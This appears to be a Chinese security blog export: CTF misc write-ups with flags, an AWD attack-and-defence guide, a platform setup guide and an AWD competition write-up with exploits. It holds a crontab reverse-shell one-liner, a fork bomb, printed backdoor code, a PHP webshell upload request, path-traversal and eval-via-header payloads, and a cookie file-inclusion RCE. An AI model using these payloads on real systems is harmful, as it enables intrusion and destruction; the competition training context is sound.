通过docx中的hint5.20和7.11发现mp4的5.67秒存在敲击码..... ../... ./... ./... ../，7.37秒存在字符串dXBfdXBfdXA=
解密得到wllmup_up_up
flag在解压出的图片尾部

flag{A2e_Y0u_Ok?}

[SUCTF2018]single dogbinwalk分离出一个txt，aaencode解密得到flag

flag{happy double eleven}

我吃三明治flag藏在两张图片的中间，base64解一下即可

flag{6f1797d4080b29b64da5897780463e30}

[ACTF新生赛2020]NTFS数据流ntfs流隐写

flag{AAAds_nntfs_ffunn?}

john-in-the-middle先将所有图片提取出来，stegsolve观察其中一张时发现flag

flag{J0hn_th3_Sn1ff3r}

喵喵喵[ACTF新生赛2020]swpforemost分离wget.pcapng，得到一个伪加密的压缩包，7-zip直接解压，虽然提示失败但还是会得到一个.flag.swp

flag{c5558bcf-26da-4f8b-b181-b61f3850b9e5}

[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;base64流加密
# -*- coding: utf-8 -*-#base64解码脚本，Python2 运行b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;# 2.txt为需要解码的文件with open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;) as f:    bin_str = &#x27;&#x27;    for line in f.readlines():        stegb64 = &#x27;&#x27;.join(line.split())        rowb64 =  &#x27;&#x27;.join(stegb64.decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).split())        offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1]))        equalnum = stegb64.count(&#x27;=&#x27;) #no equalnum no offset        if equalnum:            bin_str += bin(offset)[2:].zfill(equalnum * 2)        print &#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) #8位一组


flag{fazhazhenhaoting}

Mysteriousshift+f12搜索字符串，定位到主要函数处

根据条件，要满足第四五六位是xyz，总体不能超过6位，v4被atoi()函数转为数字整型并且+1，所以第一个应该输入122
合在一起输入122xyz得到flag

flag{123_Buff3r_0v3rf|0w}

间谍启示录foremost分离iso文件，解压rar后运行flag.exe得到机密文件.txt

flag{379:7b758:g7dfe7f19:9464f:4g9231}

[UTCTF2020]docx将文件后缀改为zip解压，在media目录下得到包含flag的图片

flag{unz1p_3v3ryth1ng}

弱口令注释中有东西，tab转-，空格转.，摩斯解密得到HELL0FORUM
lsb隐写，密码是123456


flag{jsy09-wytg5-wius8}

[RoarCTF2019]黄金6年某些书上有二维码，扫码拼接后得到iwantplayctf
mp4文件结尾得到一串base64字符串，解码后得到一个rar文件
用二维码中的密码解压得到flag

flag{CTF-from-RuMen-to-RuYuan}

小易的U盘foremost解压后得到一个压缩包查看autorun.inf文件，发现指向了autoflag - 副本 (32)ida打开就是flag

flag{29a0vkrlek3eu10ue89yug9y4r0wdu10}

[WUSTCTF2020]alison_likes_jojoforemost分离boki.jpg，得到一个zip
爆破密码，纯数字888866
txt中的内容数层base64解密得到killerqueen
outguess隐写outguess -r ../jljy.jpg -t 123.txt -k killerqueen

flag{pretty_girl_alison_likes_jojo}

[安洵杯 2019]吹着贝斯扫二维码zip下载附件，解压得到68个压缩包，并且每个压缩文件里都有一个4个字节大小的名为data.txt的txt文件，于是尝试用crc32碰撞还原出所有压缩包中的文件内容
得到z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==
解码后看到提示:fix the file and get the flag
添加rar头52 61 72 21 1A 07 00，在注释中看到flag

flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}

[GUET-CTF2019]zips先纯数字爆破，得到密码723456
伪加密得到setup.sh
#!/bin/bash#zip -e --password=`python -c &quot;print(__import__(&#x27;time&#x27;).time())&quot;` flag.zip flag

根据时间戳爆破密码得到1558080832.15

flag{fkjabPqnLawhvuikfhgzyffj}

从娃娃抓起中文电码+五笔
人工智能+也要从娃娃抓起

flag{3b4b5dccd2c008fe7e2664bd1bc19292}

[DDCTF2018](╯°□°）╯︵ ┻━┻两位一组转十进制，-128后转为字符串

flag{922ab9974a47cd322cf43b50610faea5}

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuctf】加固题-Ezsql</title>
    <url>/posts/b7823512/</url>
    <content><![CDATA[第一次做到这种类型的题目，挺有意思的
连接首先ssh连上靶机
代码审计进入网站根目录/var/www/html
查看dbConnect.php发现只是连接数据库的
再看index.php看到核心代码没有任何过滤
方法1addslashes函数addslashes($string)：用反斜线引用字符串中的特殊字符’ “ \
防护将username和password处理一下
方法2黑名单替换设置一个黑名单$blacklist = [&quot;&gt;&quot;,&quot;;&quot;,&quot;|&quot;,&quot;union&quot;,&quot;select&quot;,&quot;or&quot;,&quot;#&quot;,&quot;--+&quot;,&quot;%&quot;,&quot;&#39;&quot;,&quot; &quot;];
防护$username = str_replace($blacklist,&quot;&quot;,$username);$password = str_replace($blacklist,&quot;&quot;,$password);
check检测通过
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>buuctf</tag>
        <tag>awdp</tag>
      </tags>
  </entry>
  <entry>
    <title>AWD攻击与防御</title>
    <url>/posts/6118732e/</url>
    <content><![CDATA[攻击主机发现如果官方没公开靶机地址（通常不会给），则攻击手首先要做的事就是先找到每个主机地址和端口
用工具或者自己的脚本都行，不过建议提前准备好脚本，现场写会慢一点可能还会出问题
弱口令ssh弱口令可能会有些队伍没有改
web弱口令一般在后台登录处，或者phpmyadmin之类的服务
代码审计代码审计是攻防一体的工作，当发现漏洞时，进攻的同时跟防守的队友商讨如何修复
预留后门某些地市级awd比赛为了降低难度一般会设置一句话木马，注意第一时间删除然后用脚本去批量打其他主机
其他漏洞
将源码下载到本地，先用D盾或者河马等扫描工具大概扫描下，在深入挖掘漏洞
权限维持不死马
参考文章：AWD不死马与克制方法
内核漏洞提权
https://github.com/The-Z-Labs/linux-exploit-suggester

crontab写定时任务
//每分钟反弹shell到 127.0.0.1的5353端口(crontab -l;printf &quot;* * * * * /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/5353 0&gt;&amp;1&#x27;\n&quot;)|crontab -



搅屎1：到最后一轮时，该拿完的flag拿到时可以进行删站，无限复制等操作
2：fork炸弹
##!/bin/sh/bin/echo &#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27; &gt; /tmp/aaa;/bin/bash /tmp/aaa;

防御web防御ssh登录ssh命令登录或者使用图形化工具连接
//ssh连接ssh -p 2222 ctf@xx.xx.xx.xx//免密登录ssh-copy-id -i ~/.ssh/id_rsa.pub ctf@xx.xx.xx.xx


备份源码比赛一开始就需要有一个队友对网站源码和数据库数据进行备份，如果后续被删站了可以及时恢复
##网址备份tar -zcvf web.tar.gz /var/www/html##数据库备份-全部数据mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql##数据库备份-指定数据库和表mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql##数据库恢复（mysql终端下执行）source /tmp/db.sql



改密码ssh密码如果发现拿到的ssh密码不是类似于SDs2dKJaH5hs的随机强口令，而是类似于ctf/123456，则需要更改ssh密码
passwd

web后台密码一般题目大概率是一个cms或者自己写的网站，那么后台就有可能存在弱口令，需要修改
mysql密码mysql密码是很多队伍会忽略的地方，当然也同样重要。改完要注意cms中的配置文件，不然可能会导致cms连不上数据库而崩溃
##方法一（mysql终端下执行）show databases;use mysqlset password for root@localhost = password(&#x27;123&#x27;);##方法二（mysql终端下执行）update user set password = PASSWORD(&#x27;需要更换的密码&#x27;) where user=&#x27;root&#x27;;flush privileges;show tables;##方法三mysqladmin -u用户名 -p旧密码 password 新密码



代码审计一般先用D盾，河马等工具扫一遍，发现一句话木马等较明显的漏洞，再用seay等或手动分析，或者可以找找历史漏洞cve等
找到漏洞后根据漏洞的种类进行修复
1：删站不建议。如果参赛手册中没有明确禁止，这是最简单粗暴的姿势
2：删页面只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等
3：破坏正常功能如果手册中规定了不能删除任何页面，则可以让这些漏洞点的功能函数失效
4：正常修补手段如加白名单，字符过滤转义，设置open_basedir等，有权限还可以修改php.ini，改完记得重启
;禁用危险函数disable_functions = exec,system,shell_exec,popen,passthru,pcntl_exec,phpinfo;预防sql注入magic_quotes_gpc = on;远程文件包含allow_url_fopen = offallow_url_include = off;重启php服务service php-fpm restart



上wafwaf也是比较重要的一点。一般可以分为两个类型，一种是只有监控的功能，可以监控流量方便分析其他队的payload，一般比赛的检查都能通过。另一种就是带拦截的防御waf，也称通防，一般比赛不允许使用
几个waf项目
1：AoiAWD安恒维护的开源项目，需要提前在本机编译，支持web，pwn流量捕获，系统进程监控等地址：https://github.com/DasSecurity-HatLab/AoiAWD
2：watchbird通防waf，支持流量转发和替换flag，防御注入，反序列化，rce等漏洞地址：https://github.com/leohearts/awd-watchbird
shell查杀对于不死马可以参考我以前写的一篇文章：AWD不死马与克制方法
一些find命令
##寻找最近20分钟修改过的文件find /var/www/html -name *.php -mmin -20##寻找行数最短的文件find ./ -name &#x27;*.php&#x27; | xargs wc -l | sort -rg##关键字查杀find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;eval(&#x27;


查看进程
netstat -nlptps -dftop

杀死进程
kill -9 PIDkillall 名称


别名经过实践，发现别名似乎在网站上rce执行命令时并不会生效
##修改cat的别名alias cat=&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;alias cat=&quot;printf &#x27;flag&#123;%s&#125;&#x27; $(date | md5sum | cut -d &#x27; &#x27; -f1)&quot;##去除别名unalias -a




pwn防御打patch参考：https://q1iq.top/IDA-patch
上通防现在大部分比赛不允许上通防，因为通防基本可以实现完美防御
通防是通用防御的简称。因为awd里pwn题的形式基本都是运行一个二进制，然后把二进制的流量转发到某个端口，所以如果给这个pwn题加个壳子过滤一下流量，所有带flag的字符串都不允许输出，所有带flag的文件都不允许打开，基本上就没办法攻击了。
以下是几个通防项目
PwnSandboxForCTF：Ptrace，劫持敏感syscall，检查参数过滤敏感字符串
evilPatcher：Seccomp沙盒，劫持syscall，无法过滤指针类参数
pwn_waf：抓取流量、通防、转发、多人转发模式，
LIEF：劫持敏感函数调用，过滤敏感字符串等。对原文件改动较小
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>Cardinal平台部署</title>
    <url>/posts/f7d25d2e/</url>
    <content><![CDATA[环境要求如果是团队内部局域网比赛一个虚拟机就够用了，甚至靶机都可以部署在同一台上，文中虚拟机为centos7平台本身可以不需要docker，但靶机大部分需要docker环境，文中docker版本为20.10.9还需要有一个数据库来存数据，这里用到是mysql
安装mysql安装mysqlyum -y install mariadb-server mariadb设置mysql开机自启动和启动mysqlsystemctl start mariadb &amp;&amp; systemctl enable mariadb设置mysql root用户密码mysqladmin -u root password 123456进入数据库mysql -u root -p123456创建数据库，注意编码create database `cardinal` default character set utf8mb4 collate utf8mb4_unicode_ci;
安装Cardinal首先下载对应的安装包
解压tar -zxvf Cardinal_v0.7.3_linux_amd64.tar.gz
运行./Cardinal如果没有权限需要添加执行权限chmod +x ./Cardinal
Cardinal配置根据提示来即可
管理地址http://ip:port/manager/
靶机配置找个docker-awd靶机这里以glzjin/20190511_awd_docker_b4为例子
下载靶机docker pull glzjin/20190511_awd_docker_b4
以三个队伍（lewiserii,rot,whatisup）为例创建三个靶机分别开放80和22端口
比赛前题目配置先添加三个队伍
创建题目
添加靶机，注意ssh是root，因为没权限会写不进flag
生成flag
更改靶机root密码
写入flag和验证靶机
开始比赛选手用事先定义的账号密码登录http://ip:port即可
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>平台搭建部署</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>第一届长城杯信息安全铁人三项赛半决赛（第三赛区）AWD WP</title>
    <url>/posts/359b7a99/</url>
    <content><![CDATA[rank: 6
tomcat漏洞1-文件上传getshelldata.sql泄露教师账号密码
INSERT INTO `teacher` VALUES (&#x27;admin&#x27;,&#x27;admin1&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;admin@qq.com&#x27;);

登录后台login.jsp
后台用户上传头像处存在任意文件上传

攻击：

修复：
修改后台密码&#x2F;修改上传代码&#x2F;增加waf
漏洞2-默认后门\webapps\ROOT\forget.jsp存在后门
&lt;%    String cmdParameter = request.getParameter(&quot;cmd1&quot;);    if (cmdParameter != null &amp;&amp; !cmdParameter.isEmpty()) &#123;        try &#123;            // 构建系统命令            ProcessBuilder processBuilder = new ProcessBuilder();            processBuilder.command(&quot;sh&quot;, &quot;-c&quot;, cmdParameter);            // 执行命令并获取输出            Process process = processBuilder.start();            InputStream inputStream = process.getInputStream();            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));            String line;            StringBuilder output = new StringBuilder();            while ((line = reader.readLine()) != null) &#123;                output.append(line).append(&quot;\n&quot;);            &#125;            // 输出命令执行结果            out.println(&quot;Command executed successfully. Output:\n&quot; + output.toString());        &#125; catch (IOException e) &#123;            out.println(&quot;Error executing command: &quot; + e.getMessage());        &#125;    &#125;%&gt;


攻击：
开局很快都修复了，手动交了两三个
修复：
把密码改了
cms漏洞1-任意文件读取\app\frontend\controller\Ajax.php 存在任意文件读取
public function getfile($file)&#123;    $file = root_path().&#x27;public/storage/uploads/&#x27;.$file;    // 检查文件是否存在    if (!file_exists($file)) &#123;        $result = [&#x27;code&#x27; =&gt; 0, &#x27;msg&#x27; =&gt; lang(&#x27;file not exists!&#x27;)];        return json($result);    &#125;    // 获取文件名    $fileName = basename($file);    // 设置HTTP响应头    header(&#x27;Content-Type: application/octet-stream&#x27;);    header(&#x27;Content-Disposition: attachment; filename=&#x27; . $fileName);    header(&#x27;Content-Length: &#x27; . filesize($file));    // 读取文件并输出给用户    readfile($file);    // 终止脚本继续执行    exit;&#125;



攻击：
/frontend/Ajax/getfile?file=../../../../../../flag


修复：
增加过滤
public function getfile($file)    &#123;        $file = root_path().&#x27;public/storage/uploads/&#x27;.$file;        // 检查文件是否存在        $file = str_replace(&quot;../&quot;,&quot;&quot;,$file);        $file = str_replace(&quot;flag&quot;,&quot;&quot;,$file);        if (!file_exists($file)) &#123;            $result = [&#x27;code&#x27; =&gt; 0, &#x27;msg&#x27; =&gt; lang(&#x27;file not exists!&#x27;)];            return json($result);        &#125;        // 获取文件名        $fileName = basename($file);        // 设置HTTP响应头        header(&#x27;Content-Type: application/octet-stream&#x27;);        header(&#x27;Content-Disposition: attachment; filename=&#x27; . $fileName);        header(&#x27;Content-Length: &#x27; . filesize($file));        // 读取文件并输出给用户        readfile($file);        // 终止脚本继续执行        exit;    &#125;

漏洞2-默认后门\app\api\controller\v1\Token.php存在任意命令执行
&lt;?phpnamespace app\api\controller\v1;use fun\auth\Api;use think\App;use think\facade\Request;use think\facade\Config;/** * 生成token */class Token extends Api&#123;    protected $noAuth = [&#x27;*&#x27;];    public function __construct(App $app)    &#123;        parent::__construct($app);        //跨域        header(&#x27;Access-Control-Allow-Origin:*&#x27;);        header(&#x27;Access-Control-Allow-Headers:Accept,Referer,Host,Keep-Alive,User-Agent,X-Requested-With,Cache-Control,Content-Type,Cookie,token&#x27;);        header(&#x27;Access-Control-Allow-Credentials:true&#x27;);        header(&#x27;Access-Control-Allow-Methods:GET, POST, PATCH, PUT, DELETE,OPTIONS&#x27;);    &#125;    public function build(Request $request)    &#123;        $class = ucwords(&#x27;\\fun\\auth\\&#x27;.ucfirst($this-&gt;type).&#x27;Token&#x27;);        $token = $class::instance();        $token-&gt;build();    &#125;    public function refresh(Request $request)    &#123;        $class = ucwords(&#x27;\\fun\\auth\\&#x27;.ucfirst($this-&gt;type).&#x27;Token&#x27;);        $token = $class::instance();        $token-&gt;refresh();    &#125;       public function test()&#123;    @eval(getallheaders()[&#x27;Referer&#x27;]);    &#125;&#125;

攻击：
GET /api/v1.token/test HTTP/1.1Host: 8.147.134.118:24631Referer:system(&quot;cat /flag&quot;);


修复：
添加注释
public function test()&#123;    //@eval(getallheaders()[&#x27;Referer&#x27;]);&#125;

漏洞3-文件上传getshell貌似还有个任意文件上传，比赛的时候没时间看了
赛后复现
注册后的基本设置有上传头像的地方

定位代码
&#x2F;app&#x2F;common&#x2F;service&#x2F;UploadService.php
/** * @param $file * @return bool * @throws Exception * 检测文件是否符合要求 */protected function checkFile()&#123;    //禁止上传PHP和HTML.ssh等脚本文件    if (//           in_array($this-&gt;file-&gt;getMime(),//               [&#x27;application/octet-stream&#x27;, &#x27;text/html&#x27;,&#x27;application/x-javascript&#x27;,&#x27;text/x-php&#x27;,&#x27;aplication/x-msdownload&#x27;,&#x27;application/java-archive&#x27;])//           ||    in_array($this-&gt;file-&gt;extension(),        [&#x27;php&#x27;, &#x27;html&#x27;, &#x27;htm&#x27;,&#x27;xml&#x27;,&#x27;ssh&#x27;,&#x27;bat&#x27;,&#x27;jar&#x27;,&#x27;java&#x27;])) &#123;        throw new Exception(lang(&#x27;File format is limited&#x27;));    &#125;    //文件大小限制    if (($this-&gt;file-&gt;getSize() &gt; $this-&gt;fileMaxsize*1024)) &#123;        throw new Exception(lang(&#x27;File size is limited&#x27;));    &#125;    //文件类型限制    if ($this-&gt;fileExt !=&#x27;*&#x27; &amp;&amp; !in_array($this-&gt;file-&gt;extension(),explode(&#x27;,&#x27;,$this-&gt;fileExt)))&#123;        throw new Exception(lang(&#x27;File type is limited&#x27;));    &#125;    $file_ext = $this-&gt;file-&gt;extension();    if (in_array($this-&gt;file-&gt;getMime(), [&#x27;image/gif&#x27;, &#x27;image/jpg&#x27;, &#x27;image/jpeg&#x27;, &#x27;image/bmp&#x27;,&#x27;image/png&#x27;, &#x27;image/webp&#x27;]) || in_array($file_ext, [&#x27;gif&#x27;, &#x27;jpg&#x27;, &#x27;jpeg&#x27;, &#x27;bmp&#x27;, &#x27;png&#x27;,&#x27;webp&#x27;])) &#123;        $imgInfo = getimagesize($this-&gt;file-&gt;getPathname());        if (!$imgInfo || !isset($imgInfo[0]) || !isset($imgInfo[1])) &#123;            throw new Exception(lang(&#x27;Uploaded file is not a valid image&#x27;));        &#125;        $this-&gt;width = isset($imgInfo[0]) ? $imgInfo[0] : 0;        $this-&gt;height = isset($imgInfo[1]) ? $imgInfo[1] : 0;    &#125;    return true;&#125;

限制了部分后缀，用phtml绕过

POST未授权上传，不需要登录POST /frontend/ajax/uploads HTTP/1.1Host: 192.168.100.129Content-Length: 206Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbISZWkAvBPdc8u0Origin: http://192.168.100.129Referer: http://192.168.100.129/frontend/member/set.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close------WebKitFormBoundaryDbISZWkAvBPdc8u0Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;Content-Type: image/jpeg&lt;?phpeval($_POST[&#x27;a&#x27;]);------WebKitFormBoundaryDbISZWkAvBPdc8u0--


修复
便捷的：增加对phtml的过滤
in_array($this-&gt;file-&gt;extension(),            [&#x27;php&#x27;, &#x27;html&#x27;, &#x27;htm&#x27;,&#x27;xml&#x27;,&#x27;ssh&#x27;,&#x27;bat&#x27;,&#x27;jar&#x27;,&#x27;java&#x27;,&#x27;phtml&#x27;])) &#123;            throw new Exception(lang(&#x27;File format is limited&#x27;));        &#125;

或者稍微麻烦一点的，增加一个白名单
&#x2F;app&#x2F;frontend&#x2F;controller&#x2F;Ajax.php
/** * @return \think\response\Json * @throws \think\db\exception\DataNotFoundException * @throws \think\db\exception\DbException * @throws \think\db\exception\ModelNotFoundException * 文件上传总入口 集成qiniu ali tenxunoss */public function uploads()&#123;    try &#123;        $list = [&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;,&#x27;jpeg&#x27;];        $file = $this-&gt;request-&gt;file(&#x27;file&#x27;);        $ext = strtolower(pathinfo($file-&gt;getOriginalName(), PATHINFO_EXTENSION));        if (!in_array($ext,$list))&#123;            throw new Exception(&#x27;NO&#x27;);        &#125;        $upload = UploadService::instance();        $result = $upload-&gt;uploads(session(&#x27;member.id&#x27;),0);        return json($result);    &#125; catch (Exception $e) &#123;        $this-&gt;error($e-&gt;getMessage());    &#125;&#125;


漏洞4-后台文件上传+文件包含RCE赛后复现
F12 泄露账号密码
&lt;script&gt;    layui.use([&#x27;layer&#x27;, &#x27;jquery&#x27;], function () &#123;        var $ = layui.jquery,            layer = layui.layer;        $(&#x27;.layui-tips&#x27;).hover(function () &#123;            layer.tips(&#x27;账号admin,密码123456&#x27;);        &#125;)    &#125;)&lt;/script&gt;

访问/backend登录后台
发现有一个离线安装插件的功能
审计代码
&#x2F;app&#x2F;backend&#x2F;controller&#x2F;Addon.php
/** * @NodeAnnotation(title=&quot;离线安装&quot;) * @throws Exception */public function localinstall()&#123;    if($this-&gt;request-&gt;isAjax())&#123;        set_time_limit(0);        $urls = parse_url(input(&#x27;url&#x27;));        $file = $urls[&#x27;path&#x27;]??&#x27;&#x27;;        if($file &amp;&amp; file_exists(&#x27;.&#x27;.$file))&#123;            try &#123;                $res = ZipHelper::unzip(&#x27;.&#x27;.$file,&#x27;../addons&#x27;);            &#125;catch (\Exception $e)&#123;                $this-&gt;error($e-&gt;getMessage());            &#125;            if($res)&#123;                $index = strpos($res, &#x27;/&#x27;);                $addon = $index ? substr($res,0,$index):$res;                $this-&gt;install($addon,&#x27;local&#x27;);            &#125;            $this-&gt;success(&#x27;upload success&#x27;);        &#125;    &#125;&#125;

&#x2F;vendor&#x2F;funadmin&#x2F;fun-addons&#x2F;src&#x2F;helper&#x2F;ZipHelper.php
/** *  解压文件 * @param $zipFile 相对文件路劲 * @param $folderPath 相对文件夹路劲 */public static function unzip( $zipFile,$folderPath,$addon=0)&#123;    // Initialize archive object    if (!class_exists(&#x27;ZipArchive&#x27;)) &#123;        throw new \Exception(&#x27;ZinArchive not find&#x27;);    &#125;    $zip = new \ZipArchive();    try &#123;        $zip-&gt;open($zipFile);    &#125; catch (\Exception $e) &#123;        $zip-&gt;close();        throw new \Exception(&#x27;Unable to open the zip file&#x27;);    &#125;    if (!is_dir($folderPath)) &#123;        @mkdir($folderPath, 0755);    &#125;    $fileDir = trim($zip-&gt;getNameIndex(0), &#x27;/&#x27;);    //解压压缩包    try &#123;        $zip-&gt;extractTo($folderPath);    &#125; catch (\Exception $e) &#123;        throw new \Exception(&#x27;Unable to extract the file&#x27;);    &#125; finally &#123;        $zip-&gt;close();    &#125;    return $fileDir;&#125;

可以发现虽然报错了，但是依然会解压到addons目录下

但是无法访问到，这里需要用到文件上传+文件包含组合拳进行利用
&#x2F;app&#x2F;backend&#x2F;controller&#x2F;Ajax.php
/** * @return \think\response\Jsonp * 自动加载语言函数 */public function lang()&#123;    header(&#x27;Content-Type: application/javascript&#x27;);    $name = $this-&gt;request-&gt;get(&quot;controllername&quot;);    $name = strtolower(parse_name($name, 1));    $app = $this-&gt;request-&gt;get(&quot;app&quot;);    return jsonp($this-&gt;loadlang($name, $app))-&gt;code(200)-&gt;options([        &#x27;var_jsonp_handler&#x27; =&gt; &#x27;callback&#x27;,        &#x27;default_jsonp_handler&#x27; =&gt; &#x27;jsonpReturn&#x27;,        &#x27;json_encode_param&#x27; =&gt; JSON_PRETTY_PRINT | JSON_FORCE_OBJECT |JSON_UNESCAPED_UNICODE,    ])-&gt;allowCache(true)-&gt;expires(7200);&#125;

跟进loadlang方法
&#x2F;app&#x2F;common&#x2F;controller&#x2F;Backend.php
protected function loadlang($name,$app)&#123;    $lang = cookie(config(&#x27;lang.cookie_var&#x27;));    if($app &amp;&amp; $app!==&#x27;backend&#x27;)&#123;        $res =  Lang::load([            $this-&gt;app-&gt;getBasePath() .&#x27;backend&#x27;. DS . &#x27;lang&#x27; . DS . $lang . &#x27;.php&#x27;,            $this-&gt;app-&gt;getBasePath() .$app. DS . &#x27;lang&#x27; . DS . $lang  . &#x27;.php&#x27;,            $this-&gt;app-&gt;getBasePath() .$app. DS . &#x27;lang&#x27; . DS . $lang . DS . str_replac(&#x27;.&#x27;, DS, $name) . &#x27;.php&#x27;,        ]);   &#125;else&#123;        $res = Lang::load([            $this-&gt;app-&gt;getAppPath() . &#x27;lang&#x27; . DS . $lang . &#x27;.php&#x27;,            $this-&gt;app-&gt;getAppPath() . &#x27;lang&#x27; . DS . $lang . DS . str_replace(&#x27;.&#x27;, DS,$name) . &#x27;.php&#x27;,        ]);    &#125;    return $res;&#125;

很明显，从 lang.cookie_var 配置中获取一个cookie值并进行文件包含
查看cookie_var的名字
&#x2F;config&#x2F;lang.php
return [    // 默认语言    &#x27;default_lang&#x27;    =&gt; Env::get(&#x27;lang.default_lang&#x27;, &#x27;zh-cn&#x27;),    // 允许的语言列表    &#x27;allow_lang_list&#x27; =&gt; [&#x27;zh-cn&#x27;,&#x27;en-us&#x27;],    // 多语言自动侦测变量名 / 自动侦测的GET变量名    &#x27;detect_var&#x27;      =&gt; &#x27;lang&#x27;,    // 是否使用Cookie记录    &#x27;use_cookie&#x27;      =&gt; true,    // 多语言cookie变量    &#x27;cookie_var&#x27;      =&gt; &#x27;think_lang&#x27;,    // 扩展语言包    &#x27;extend_list&#x27;     =&gt; [],    // Accept-Language转义为对应语言包名称    &#x27;accept_language&#x27; =&gt; [        &#x27;zh-hans-cn&#x27; =&gt; &#x27;zh-cn&#x27;,    ],    // 是否支持语言分组    &#x27;allow_group&#x27;     =&gt; true,];

因为是全局变量，所以任何地方都可以调用
包含的时候注意后缀 .php 已经存在了，不需要再写

POST / HTTP/1.1Host: 0dbaba9b-169b-4afb-ab9d-71f60e228260.ctfd.lewiserii.top:8080Cookie: think_lang=/../../../addons/shell;Content-Type: application/x-www-form-urlencodedContent-Length: 19a=system(&#x27;whoami&#x27;);

修复
对 $lang 进行过滤即可
DocToolkit漏洞1-默认后门存在默认后门
package com.example.doctoolkit.controller.test;import java.io.IOException;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RequestMapping(&#123;&quot;/test&quot;&#125;)@RestController/* loaded from: DocToolkit-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/doctoolkit/controller/test/TestController.class */public class TestController &#123;    @RequestMapping(&#123;&quot;/backd0or&quot;&#125;)    public String backdoor(@RequestParam(&quot;cmd&quot;) String command) throws IOException &#123;        if (command != null) &#123;            boolean isLinux = true;            String osType = System.getProperty(&quot;os.name&quot;);            if (osType != null &amp;&amp; osType.toLowerCase().contains(&quot;windows&quot;)) &#123;                isLinux = false;            &#125;            byte[] bytes = new byte[1024];            String[] cmds = isLinux ? new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, command&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, command&#125;;            Process process = new ProcessBuilder(cmds).start();            int len = process.getInputStream().read(bytes);            String output = new String(bytes, 0, len);            return output;        &#125;        return null;    &#125;&#125;

攻击：
/test/backd0or?cmd=cat /flag

修复：
没修复成功。。
漏洞2-shiro反序列化有shiro依赖
在shiro的配置文件中发现了固定秘钥

直接用工具打就好了，然后抓流量进行批量

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>awd</tag>
        <tag>长城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>汉明码计算</title>
    <url>/posts/bf9bf50c/</url>
    <content><![CDATA[现在有一个二进制字符串：10110110111，我们要计算它的奇偶校验

汉明公式：2^n &gt;&#x3D; x + n + 1 (n为校验码位数 x为二进制字符串位数)


2^n &gt;&#x3D; 11 + n + 1

所以得到n=4

校验码位置：2^i(i&#x3D;0,1,2,…,校验码位数-1)

得到校验码的位置为1，2，4，8,因此我们可以列出以下表格（红方框表示校验码位置）

然后将需要编码的二进制字符串填入表格中
接着将序号中二进制数第1位（从右往左数）为1、第2位为1、第3位为1、第4位为1的序号以次放入第1、2、3、4组

第1组：1(0011) 3(0011) 5(0101) 7(0111) 9(1001) 11(1011) 13(1101) 15(1111)第2组：2(0100) 3(0011) 6(0110) 7(0111) 10(1010) 11(1011) 14(1110) 15(1111)第3组：4(0100) 5(0101) 6(0110) 7(0111) 12(1100) 13(1101) 14(1110) 15(1111)第4组：8(1000) 9(1001) 10(1010) 11(1011) 12(1100) 13(1101) 14(1110) 15(1111)

分组完成后我们就计算出每一组中序号对应的值中有几个1

第1组：5个第2组：4个第3组：5个第4组：5个

根据每组当中1的个数，我们就能计算出校验码的值，若为奇校验，则校验码为0010；若为偶校验，则校验码为1101编码后的结果如下

奇校验：101101100110110偶校验：101101110111101

参考文章
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】击剑杯-wp</title>
